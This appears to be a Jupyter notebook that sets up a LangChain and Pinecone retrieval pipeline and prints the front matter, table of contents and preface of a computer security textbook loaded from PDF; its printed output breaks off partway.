{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "24472a14",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/home/subhankhurshid/Documents/personal-projects/medical-app/research'"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "%pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "9004ca0b",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "os.chdir(\"../\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "a0b4c9ea",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/home/subhankhurshid/Documents/personal-projects/medical-app'"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "%pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "f2301b2c",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/home/subhankhurshid/Documents/personal-projects/medical-app/.venv/lib/python3.12/site-packages/tqdm/auto.py:21: TqdmWarning: IProgress not found. Please update jupyter and ipywidgets. See https://ipywidgets.readthedocs.io/en/stable/user_install.html\n",
      "  from .autonotebook import tqdm as notebook_tqdm\n"
     ]
    }
   ],
   "source": [
    "from langchain.document_loaders import PyPDFLoader, DirectoryLoader\n",
    "from langchain.text_splitter import RecursiveCharacterTextSplitter\n",
    "from langchain.embeddings import HuggingFaceEmbeddings\n",
    "from pinecone import Pinecone, ServerlessSpec\n",
    "from dotenv import load_dotenv\n",
    "from langchain_pinecone import PineconeVectorStore\n",
    "from openai import OpenAI\n",
    "from langchain.chains import create_retrieval_chain\n",
    "from langchain.chains.combine_documents import create_stuff_documents_chain\n",
    "from langchain_core.prompts import ChatPromptTemplate\n",
    "from langchain_google_genai import ChatGoogleGenerativeAI\n",
    "import torch"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "fff5a902",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "12.6\n",
      "90501\n"
     ]
    }
   ],
   "source": [
    "print(torch.version.cuda)   # vs. `nvidia-smi` reported version\n",
    "print(torch.backends.cudnn.version())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "e82e0300",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "load_dotenv()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "c6baa574",
   "metadata": {},
   "outputs": [],
   "source": [
    "def load_pdf_doc(data):\n",
    "    loader = DirectoryLoader(data, glob=\"*.pdf\", loader_cls=PyPDFLoader)\n",
    "    documents = loader.load()\n",
    "    return documents\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "7c68e78d",
   "metadata": {},
   "outputs": [],
   "source": [
    "data = load_pdf_doc(data='data')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "7d9aa071",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 0, 'page_label': 'Front Cover'}, page_content=''),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 1, 'page_label': 'IFC'}, page_content='A01_STAL0611_04_GE_FM.indd   1 10/12/17   8:43 PM\\nDigital Resources for Students\\nYour new textbook provides 12-month access to digital resources that may include VideoNotes \\n(step-by-step video tutorials on programming concepts), source code, web chapters, quizzes, and \\nmore. Refer to the preface in the textbook for a detailed list of resources.\\nFollow the instructions below to register for the Companion Website for William Stallings/Lawrie \\nBrown’s Computer Security: Principles and Practice, Fourth Edition, Global Edition.\\n1. Go to www.pearsonglobaleditions.com/stallings.\\n2. Enter the title of your textbook or browse by author name.\\n3. Click Companion Website.\\n4.  Click Register and follow the on-screen instructions to create a login name and\\npassword.\\nUse a coin to scratch off the coating and reveal your access code.\\nDo not use a sharp knife or other sharp object as it may damage the code.\\nUse the login name and password you created during registration to start using the  \\nonline resources that accompany your textbook. \\nIMPORTANT: \\nThis access code can only be used once. This subscription is valid for 12 months upon activation and \\nis not transferrable. If the access code has already been revealed it may no longer be valid.\\nFor technical support go to https://support.pearson.com/getsupport/'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 2, 'page_label': '1'}, page_content='William Stallings\\nLawrie Brown\\nUNSW Canberra at the Australian Defence Force Academy\\nComputer Security\\nPrinciples and Practice\\nFourth Edition\\nGlobal Edition\\n330 Hudson Street, New York, NY 10013\\nA01_STAL0611_04_GE_FM.indd   1 10/12/17   8:43 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 3, 'page_label': '2'}, page_content='Director, Portfolio Management: Engineering, \\n Computer Science & Global Editions:  \\n Julian Partridge\\nSpecialist, Higher Ed Portfolio Management:  \\n Tracy Johnson (Dunkelberger)\\nAcquisitions Editor, Global Edition: Sourabh \\nMaheshwari\\nPortfolio Management Assistant: Meghan Jacoby\\nManaging Content Producer: Scott Disanno\\nContent Producer: Robert Engelhardt\\nProject Editor, Global Edition: K.K. Neelakantan\\nWeb Developer: Steve Wright\\nManager, Media Production, Global Edition: Vikram \\nKumar\\nRights and Permissions Manager: Ben Ferrini\\nManufacturing Buyer, Higher Ed, Lake Side \\n Communications Inc (LSC): Maura Zaldivar-Garcia\\nSenior Manufacturing Controller, Global Edition: \\nAngela Hawksbee\\nInventory Manager: Ann Lam\\nProduct Marketing Manager: Yvonne Vannatta\\nField Marketing Manager: Demetrius Hall\\nMarketing Assistant: Jon Bryant\\nCover Designer: Lumina Datamatics, Inc.\\nCover Photo: Alex Kosev / Shutterstock\\nFull-Service Project Management: Kirthika Raj,  \\n SPi Global\\nCredits and acknowledgments borrowed from other sources and reproduced, with permission, in this textbook \\nappear on page 777 .\\nMany of the designations by manufacturers and seller to distinguish their products are claimed as trademarks. \\nWhere those designations appear in this book, and the publisher was aware of a trademark claim, the designations \\nhave been printed in initial caps or all caps.\\nPearson Education Limited\\nKAO Two\\nKAO Park\\nHarlow\\nCM17 9NA\\nUnited Kingdom\\nand Associated Companies throughout the world\\nVisit us on the World Wide Web at:\\nwww.pearsonglobaleditions.com\\n© Pearson Education Limited 2018\\nThe rights of William Stallings and Lawrie Brown to be identified as the authors of this work have been asserted \\nby them in accordance with the Copyright, Designs and Patents Act 1988.\\nAuthorized adaptation from the United States edition, entitled Computer Security: Principles and Practice, 4th \\nEdition, ISBN 978-0-13-479410-5 by William Stallings and Lawrie Brown published by Pearson Education © 2018.\\nAll rights reserved. No part of this publication may be reproduced, stored in a retrieval system, or transmitted in \\nany form or by any means, electronic, mechanical, photocopying, recording or otherwise, without either the prior \\nwritten permission of the publisher or a license permitting restricted copying in the United Kingdom issued by the \\nCopyright Licensing Agency Ltd, Saffron House, 6–10 Kirby Street, London EC1N 8TS.\\nAll trademarks used herein are the property of their respective owners. The use of any trademark in this text does \\nnot vest in the author or publisher any trademark ownership rights in such trademarks, nor does the use of such \\ntrademarks imply any affiliation with or endorsement of this book by such owners.\\nBritish Library Cataloguing-in-Publication Data\\nA catalogue record for this book is available from the British Library\\n10 9 8 7 6 5 4 3 2 1\\nISBN 10: 1 -292-22061 -9\\nISBN 13: 978-1 -292-22061 -1\\nTypeset by SPi Global\\nPrinted and bound in Malaysia\\nA01_STAL0611_04_GE_FM.indd   2 10/12/17   8:43 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 4, 'page_label': '3'}, page_content='For my loving wife, Tricia\\n—WS\\nTo my extended family and friends, who helped  \\nmake this all possible\\n—LB\\nA01_STAL0611_04_GE_FM.indd   3 10/12/17   8:43 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 5, 'page_label': '4'}, page_content='This page intentionally left blank'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 6, 'page_label': '5'}, page_content='5\\ncontents\\nPreface 12\\nNotation 21\\nAbout the Authors 22\\nChapter 1 Overview 23\\n 1.1 Computer Security Concepts 24\\n 1.2 Threats, Attacks, and Assets 31\\n 1.3 Security Functional Requirements 37\\n 1.4 Fundamental Security Design Principles 39\\n 1.5 Attack Surfaces and Attack Trees 43\\n 1.6 Computer Security Strategy 46\\n 1.7 Standards 48\\n 1.8 Key T erms, Review Questions, and Problems 49\\n PART ONE COMPUTER SECURITY TECHNOLOGY AND PRINCIPLES 52\\nChapter 2 Cryptographic Tools 52\\n 2.1 Confidentiality with Symmetric Encryption 53\\n 2.2 Message Authentication and Hash Functions 59\\n 2.3 Public-Key Encryption 67\\n 2.4 Digital Signatures and Key Management 72\\n 2.5 Random and Pseudorandom Numbers 77\\n 2.6 Practical Application: Encryption of Stored Data 79\\n 2.7 Key T erms, Review Questions, and Problems 80\\nChapter 3 User Authentication 85\\n 3.1 Digital User Authentication Principles 86\\n 3.2 Password-Based Authentication 92\\n 3.3 T oken-Based Authentication 104\\n 3.4 Biometric Authentication 109\\n 3.5 Remote User Authentication 114\\n 3.6 Security Issues for User Authentication 117\\n 3.7 Practical Application: An Iris Biometric System 119\\n 3.8 Case Study: Security Problems for ATM Systems 121\\n 3.9 Key T erms, Review Questions, and Problems 124\\nChapter 4 Access Control 127\\n 4.1 Access Control Principles 128\\n 4.2 Subjects, Objects, and Access Rights 131\\n 4.3 Discretionary Access Control 132\\n 4.4 Example: UNIX File Access Control 139\\n 4.5 Role-Based Access Control 142\\n 4.6 Attribute-Based Access Control 148\\nA01_STAL0611_04_GE_FM.indd   5 10/12/17   8:43 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 7, 'page_label': '6'}, page_content='6  CONTENTS\\n 4.7 Identity, Credential, and Access Management 154\\n 4.8 Trust Frameworks 158\\n 4.9 Case Study: RBAC System for a Bank 162\\n 4.10 Key T erms, Review Questions, and Problems 164\\nChapter 5 Database and Data Center Security 169\\n 5.1 The Need for Database Security 170\\n 5.2 Database Management Systems 171\\n 5.3 Relational Databases 173\\n 5.4 SQL Injection Attacks 177\\n 5.5 Database Access Control 183\\n 5.6 Inference 188\\n 5.7 Database Encryption 190\\n 5.8 Data Center Security 194\\n 5.9 Key T erms, Review Questions, and Problems 200\\nChapter 6 Malicious Software 205\\n 6.1 T ypes of Malicious Software (Malware) 207\\n 6.2 Advanced Persistent Threat 209\\n 6.3 Propagation—Infected Content—Viruses 210\\n 6.4 Propagation—Vulnerability Exploit—Worms 215\\n 6.5 Propagation—Social Engineering—Spam E-mail, Trojans 224\\n 6.6 Payload—System Corruption 227\\n 6.7 Payload—Attack Agent—Zombie, Bots 229\\n 6.8 Payload—Information Theft—Keyloggers, Phishing, Spyware 231\\n 6.9 Payload—Stealthing—Backdoors, Rootkits 233\\n 6.10 Countermeasures 236\\n 6.11 Key T erms, Review Questions, and Problems 242\\nChapter 7 Denial-of-Service Attacks 246\\n 7.1 Denial-of-Service Attacks 247\\n 7.2 Flooding Attacks 255\\n 7.3 Distributed Denial-of-Service Attacks 256\\n 7.4 Application-Based Bandwidth Attacks 258\\n 7.5 Reflector and Amplifier Attacks 261\\n 7.6 Defenses Against Denial-of-Service Attacks 265\\n 7.7 Responding to a Denial-of-Service Attack 269\\n 7.8 Key T erms, Review Questions, and Problems 270\\nChapter 8 Intrusion Detection 273\\n 8.1 Intruders 274\\n 8.2 Intrusion Detection 278\\n 8.3 Analysis Approaches 281\\n 8.4 Host-Based Intrusion Detection 284\\n 8.5 Network-Based Intrusion Detection 289\\n 8.6 Distributed or Hybrid Intrusion Detection 295\\n 8.7 Intrusion Detection Exchange Format 297\\nA01_STAL0611_04_GE_FM.indd   6 10/12/17   8:43 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 8, 'page_label': '7'}, page_content='CONTENTS  7\\n 8.8 Honeypots 300\\n 8.9 Example System: Snort 302\\n 8.10 Key T erms, Review Questions, and Problems 306\\nChapter 9 Firewalls and Intrusion Prevention Systems 310\\n 9.1 The Need for Firewalls 311\\n 9.2 Firewall Characteristics and Access Policy 312\\n 9.3 T ypes of Firewalls 314\\n 9.4 Firewall Basing 320\\n 9.5 Firewall Location and Configurations 323\\n 9.6 Intrusion Prevention Systems 328\\n 9.7 Example: Unified Threat Management Products 332\\n 9.8 Key T erms, Review Questions, and Problems 336\\nPART TWO SOFTWARE AND SYSTEM SECURITY 341\\nChapter 10 Buffer Overflow 341\\n 10.1 Stack Overflows 343\\n 10.2 Defending Against Buffer Overflows 364\\n 10.3 Other forms of Overflow Attacks 370\\n 10.4 Key T erms, Review Questions, and Problems 377\\nChapter 11 Software Security 379\\n 11.1 Software Security Issues 380\\n 11.2 Handling Program Input 384\\n 11.3 Writing Safe Program Code 395\\n 11.4 Interacting with the Operating System and Other Programs 400\\n 11.5 Handling Program Output 413\\n 11.6 Key T erms, Review Questions, and Problems 415\\nChapter 12 Operating System Security 419\\n 12.1 Introduction to Operating System Security 421\\n 12.2 System Security Planning 422\\n 12.3 Operating Systems Hardening 422\\n 12.4 Application Security 426\\n 12.5 Security Maintenance 428\\n 12.6 Linux/Unix Security 429\\n 12.7 Windows Security 433\\n 12.8 Virtualization Security 435\\n 12.9 Key T erms, Review Questions, and Problems 443\\nChapter 13 Cloud and IoT Security 445\\n 13.1 Cloud Computing 446\\n 13.2 Cloud Security Concepts 454\\n 13.3 Cloud Security Approaches 457\\n 13.4 The Internet of Things 466\\n 13.5 IoT Security 470\\n 13.6 Key T erms and Review Questions 478\\nA01_STAL0611_04_GE_FM.indd   7 10/12/17   8:43 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 9, 'page_label': '8'}, page_content='PART THREE MANAGEMENT ISSUES 480\\nChapter 14 IT Security Management and Risk Assessment 480\\n 14.1 IT Security Management 481\\n 14.2 Organizational Context and Security Policy 484\\n 14.3 Security Risk Assessment 487\\n 14.4 Detailed Security Risk Analysis 490\\n 14.5 Case Study: Silver Star Mines 502\\n 14.6 Key T erms, Review Questions, and Problems 507\\nChapter 15 IT Security Controls, Plans, and Procedures 510\\n 15.1 IT Security Management Implementation 511\\n 15.2 Security Controls or Safeguards 511\\n 15.3 IT Security Plan 520\\n 15.4 Implementation of Controls 521\\n 15.5 Monitoring Risks 522\\n 15.6 Case Study: Silver Star Mines 524\\n 15.7 Key T erms, Review Questions, and Problems 527\\nChapter 16 Physical and Infrastructure Security 529\\n 16.1 Overview 530\\n 16.2 Physical Security Threats 531\\n 16.3 Physical Security Prevention and Mitigation Measures 538\\n 16.4 Recovery from Physical Security Breaches 541\\n 16.5 Example: A Corporate Physical Security Policy 541\\n 16.6 Integration of Physical and Logical Security 542\\n 16.7 Key T erms, Review Questions, and Problems 548\\nChapter 17 Human Resources Security 550\\n 17.1 Security Awareness, Training, and Education 551\\n 17.2 Employment Practices and Policies 557\\n 17.3 E-mail and Internet Use Policies 560\\n 17.4 Computer Security Incident Response Teams 561\\n 17.5 Key T erms, Review Questions, and Problems 568\\nChapter 18 Security Auditing 570\\n 18.1 Security Auditing Architecture 572\\n 18.2 Security Audit Trail 576\\n 18.3 Implementing the Logging Function 581\\n 18.4 Audit Trail Analysis 592\\n 18.5 Security Information and Event Management 596\\n 18.6 Key T erms, Review Questions, and Problems 598\\nChapter 19 Legal and Ethical Aspects 600\\n 19.1 Cybercrime and Computer Crime 601\\n 19.2 Intellectual Property 605\\n 19.3 Privacy 611\\n 19.4 Ethical Issues 618\\n 19.5 Key T erms, Review Questions, and Problems 624\\n8  CONTENTS\\nA01_STAL0611_04_GE_FM.indd   8 10/12/17   8:43 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 10, 'page_label': '9'}, page_content='PART FOUR CRYPTOGRAPHIC ALGORITHMS 627\\nChapter 20 Symmetric Encryption and Message Confidentiality 627\\n 20.1 Symmetric Encryption Principles 628\\n 20.2 Data Encryption Standard 633\\n 20.3 Advanced Encryption Standard 635\\n 20.4 Stream Ciphers and RC4 641\\n 20.5 Cipher Block Modes of Operation 644\\n 20.6 Key Distribution 650\\n 20.7 Key T erms, Review Questions, and Problems 652\\nChapter 21 Public-Key Cryptography and Message Authentication 656\\n 21.1 Secure Hash Functions 657\\n 21.2 HMAC 663\\n 21.3 Authenticated Encryption 666\\n 21.4 The RSA Public-Key Encryption Algorithm 669\\n 21.5 Diffie-Hellman and Other Asymmetric Algorithms 675\\n 21.6 Key T erms, Review Questions, and Problems 679\\nPART FIVE NETWORK SECURITY 682\\nChapter 22 Internet Security Protocols and Standards 682\\n 22.1 Secure E-mail and S/MIME 683\\n 22.2 Domainkeys Identified Mail 686\\n 22.3 Secure Sockets Layer (SSL) and Transport Layer Security (TLS) 690\\n 22.4 HTTPS 697\\n 22.5 IPv4 and IPv6 Security 698\\n 22.6 Key T erms, Review Questions, and Problems 703\\nChapter 23 Internet Authentication Applications 706\\n 23.1 Kerberos 707\\n 23.2 X.509 713\\n 23.3 Public-Key Infrastructure 716\\n 23.4 Key T erms, Review Questions, and Problems 719\\nChapter 24 Wireless Network Security 722\\n 24.1 Wireless Security 723\\n 24.2 Mobile Device Security 726\\n 24.3 IEEE 802.11 Wireless LAN Overview 730\\n 24.4 IEEE 802.11i Wireless LAN Security 736\\n 24.5 Key T erms, Review Questions, and Problems 751\\nAppendix A Projects and Other Student Exercises for Teaching Computer Security 754\\n A.1 Hacking Project 754\\n A.2 Laboratory Exercises 755\\n A.3 Security Education (SEED) Projects 755\\n A.4 Research Projects 757\\n A.5 Programming Projects 758\\n A.6 Practical Security Assessments 758\\nCONTENTS  9\\nA01_STAL0611_04_GE_FM.indd   9 10/12/17   8:43 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 11, 'page_label': '10'}, page_content='A.7 Firewall Projects 758\\n A.8 Case Studies 759\\n A.9 Reading/Report Assignments 759\\n A.10 Writing Assignments 759\\n A.11 Webcasts for Teaching Computer Security 760\\nAcronyms 761\\nList of NIST and ISO Documents 762\\nReferences 764\\nCredits 777\\nIndex 780\\n10  CONTENTS\\nA01_STAL0611_04_GE_FM.indd   10 10/12/17   8:43 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 12, 'page_label': '11'}, page_content='ONLINE CHAPTERS AND APPENDICES1\\nChapter 25 Linux Security\\n 25.1 Introduction\\n 25.2 Linux’s Security Model\\n 25.3 The Linux DAC in Depth: Filesystem Security\\n 25.4 Linux Vulnerabilities\\n 25.5 Linux System Hardening\\n 25.6 Application Security\\n 25.7 Mandatory Access Controls\\n 25.8 Key T erms, Review Questions, and Problems\\nChapter 26 Windows and Windows Vista Security\\n 26.1 Windows Security Architecture\\n 26.2 Windows Vulnerabilities\\n 26.3 Windows Security Defenses\\n 26.4 Browser Defenses\\n 26.5 Cryptographic Services\\n 26.6 Common Criteria\\n 26.7 Key T erms, Review Questions, Problems, and Projects\\nChapter 27 Trusted Computing and Multilevel Security\\n 27.1 The Bell-LaPadula Model for Computer Security\\n 27.2 Other Formal Models for Computer Security\\n 27.3 The Concept of Trusted Systems\\n 27.4 Application of Multilevel Security\\n 27.5 Trusted Computing and the Trusted Platform Module\\n 27.6 Common Criteria for Information T echnology Security Evaluation\\n 27.7 Assurance and Evaluation\\n 27.8 Key T erms, Review\\nAppendix B Some Aspects of Number Theory\\nAppendix C Standards and Standard-Setting Organizations\\nAppendix D Random and Pseudorandom Number Generation\\nAppendix E Message Authentication Codes Based on Block Ciphers\\nAppendix F TCP/IP Protocol Architecture\\nAppendix G Radix-64 Conversion\\nAppendix H The Domain Name System\\nAppendix I The Base-Rate Fallacy\\nAppendix J SHA-3\\nAppendix K Glossary\\n1Online chapters, appendices, and other documents are Premium Content, available via the access code at \\nthe front of this book.\\nCONTENTS  11\\nA01_STAL0611_04_GE_FM.indd   11 10/12/17   8:43 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 13, 'page_label': '12'}, page_content='12\\npreface\\nWHAT’S NEW IN THE FOURTH EDITION\\nSince the third edition of this book was published, the field has seen continued innovations \\nand improvements. In this new edition, we try to capture these changes while maintaining a \\nbroad and comprehensive coverage of the entire field. To begin the process of revision, the \\nthird edition of this book was extensively reviewed by a number of professors who teach the \\nsubject and by professionals working in the field. The result is that in many places the narra-\\ntive has been clarified and tightened, and illustrations have been improved.\\nBeyond these refinements to improve pedagogy and user-friendliness, there have \\nbeen major substantive changes throughout the book. The most noteworthy changes are \\nas follows:\\n• Data center security:  Chapter 5 includes a new discussion of data center security, \\n including the TIA-492 specification of reliability tiers.\\n• Malware: The material on malware in Chapter 6 has been revised to include additional \\nmaterial on macro viruses and their structure, as they are now the most common form \\nof virus malware.\\n• Virtualization security: The material on virtualization security in Chapter 12 has been \\nextended, given the rising use of such systems by organizations and in cloud computing \\nenvironments. A discussion of virtual firewalls, which may be used to help secure these \\nenvironments, has also been added.\\n• Cloud security: Chapter 13 includes a new discussion of cloud security. The discussion \\nincludes an introduction to cloud computing, key cloud security concepts, an analysis of \\napproaches to cloud security, and an open-source example.\\n• IoT security: Chapter 13 includes a new discussion of security for the Internet of Things \\n(IoT). The discussion includes an introduction to IoT, an overview of IoT security issues, \\nand an open-source example.\\n• SEIM: The discussion of Security Information and Event Management (SIEM) systems \\nin Chapter 18 has been updated.\\n• Privacy: The section on privacy issues and its management in Chapter 19 has been \\nextended with additional discussion of moral and legal approaches, and the privacy \\nissues related to big data.\\n• Authenticated encryption: Authenticated encryption has become an increasingly wide-\\nspread cryptographic tool in a variety of applications and protocols. Chapter 21 includes \\na new discussion of authenticated description and describes an important authenticated \\nencryption algorithm known as offset codebook (OCB) mode.\\nA01_STAL0611_04_GE_FM.indd   12 10/12/17   8:43 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 14, 'page_label': '13'}, page_content='BACKGROUND\\nInterest in education in computer security and related topics has been growing at a dramatic rate \\nin recent years. This interest has been spurred by a number of factors, two of which stand out:\\n1. As information systems, databases, and Internet-based distributed systems and com -\\nmunication have become pervasive in the commercial world, coupled with the increased \\nintensity and sophistication of security-related attacks, organizations now recognize the \\nneed for a comprehensive security strategy. This strategy encompasses the use of special-\\nized hardware and software and trained personnel to meet that need.\\n2. Computer security education, often termed information security education or information \\nassurance education, has emerged as a national goal in the United States and other coun-\\ntries, with national defense and homeland security implications. The NSA/DHS National \\nCenter of Academic Excellence in Information Assurance/Cyber Defense is spearhead-\\ning a government role in the development of standards for computer security education.\\nAccordingly, the number of courses in universities, community colleges, and other \\n institutions in computer security and related areas is growing.\\nOBJECTIVES\\nThe objective of this book is to provide an up-to-date survey of developments in computer \\nsecurity. Central problems that confront security designers and security administrators include \\ndefining the threats to computer and network systems, evaluating the relative risks of these \\nthreats, and developing cost-effective and user friendly countermeasures.\\nThe following basic themes unify the discussion:\\n• Principles: Although the scope of this book is broad, there are a number of basic prin-\\nciples that appear repeatedly as themes and that unify this field. Examples are issues \\nrelating to authentication and access control. The book highlights these principles and \\nexamines their application in specific areas of computer security.\\n• Design appr oaches: The book examines alternative approaches to meeting specific \\n computer security requirements.\\n• Standards: Standards have come to assume an increasingly important, indeed dominant, \\nrole in this field. An understanding of the current status and future direction of technol-\\nogy requires a comprehensive discussion of the related standards.\\n• Real-world examples: A number of chapters include a section that shows the practical \\napplication of that chapter’s principles in a real-world environment.\\nSUPPORT OF ACM/IEEE COMPUTER SCIENCE CURRICULA 2013\\nThis book is intended for both an academic and a professional audience. As a textbook, \\nit is intended as a one- or two-semester undergraduate course for computer science, com -\\nputer engineering, and electrical engineering majors. This edition is designed to support \\nPREFACE  13\\nA01_STAL0611_04_GE_FM.indd   13 10/12/17   8:43 PM'),\n",
